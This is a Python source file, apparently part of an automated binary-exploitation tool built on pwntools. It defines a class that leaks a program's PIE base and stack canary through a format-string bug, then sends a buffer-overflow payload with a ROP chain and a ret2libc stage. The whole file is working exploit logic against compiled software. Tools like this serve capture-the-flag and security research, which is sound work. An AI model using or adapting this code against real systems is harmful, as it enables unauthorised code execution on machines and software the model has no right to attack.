from binary.rop_exploiter import RopExploiter
from binary.fmt_exploiter import FmtExploiter
from pwn import *


# context.log_level = 'DEBUG'

class FmtBofExploiter:
    def __init__(self, binary, vuln):
        self.binary = binary
        self.bof_exploiter = RopExploiter(self.binary, vuln)
        self.fmt_exploiter = FmtExploiter(self.binary, vuln)
        self.globals = vuln

    def trim_input(self, input, ch):
        ip = ch * self.binary.elf.bytes
        offset = input.index(ip)
        exploit_input = input[0:offset]
        return exploit_input

    def apply_exploit_input(self, proc, fmt_payload, bof_payload):
        pie = self.binary.protection["pie"]
        canary = self.binary.protection["canary"]
        current_output = b""
        for i, input in enumerate(self.globals["input"]):
            current_output += proc.clean()
            if self.bof_exploiter.first_input == b"" and current_output != b"":
                self.bof_exploiter.first_input = current_output
            ip = b"X" * self.binary.elf.bytes
            fmt = b"F" * self.binary.elf.bytes
            if ip not in input and fmt not in input:
                proc.send(input)
            elif fmt in input:
                trimmed_input = self.trim_input(input, b"F")
                leak_payload = flat(
                    trimmed_input,
                    fmt_payload
                )
                proc.sendline(leak_payload)
            elif ip in input:
                elf = self.binary.elf
                trimmed_input = self.trim_input(input, b"X")
                if pie is True and self.globals["adjusted_binary_base"] is False:
                    print("output before adjust: {}".format(current_output))
                    if b'|' in current_output:
                        leaked_pie = int(current_output.split(b'|')[1].rstrip(), 16)
                        elf.address = (leaked_pie - self.globals["pie_offset"])
                        self.globals["adjusted_binary_base"] = True
                        rop = ROP([elf])
                        rop.call(elf.entry)
                        bof_payload = rop.chain()
                if canary is True:
                    leaked_canary = int(current_output.split(b'|')[2].rstrip(), 16)
                    trimmed_input = trimmed_input.replace(b"C" * context.bytes, pack(leaked_canary))

                exploit_payload = flat(
                    trimmed_input,
                    bof_payload
                )
                proc.sendline(exploit_payload)

        current_output += proc.clean()
        log.info("current output: {}".format(current_output))
        # log.info("first input: {}".format(self.first_input))
        return current_output

    def two_stage_exploit(self):
        proc = self.binary.elf.process()
        # proc = gdb.debug(self.binary.bin_path, '''break main''')
        bin_elf = self.binary.elf
        rop = ROP([bin_elf])
        rop.call(bin_elf.entry)

        pie = self.binary.protection["pie"]
        canary = self.binary.protection["canary"]
        fmt_payload = b""

        if pie is True:
            self.globals["adjusted_binary_base"] = False
            pie_payload, pie_offset = self.fmt_exploiter.find_pie_offset()
            self.globals["pie_offset"] = pie_offset
            fmt_payload += pie_payload
        if canary is True:
            canary_payload = self.fmt_exploiter.find_canary_offset()
            fmt_payload += canary_payload
        fmt_payload = fmt_payload.replace(b"||", b"|")

        self.apply_exploit_input(proc, fmt_payload, rop.chain())

        self.bof_exploiter.ret2libc_exploit(proc)
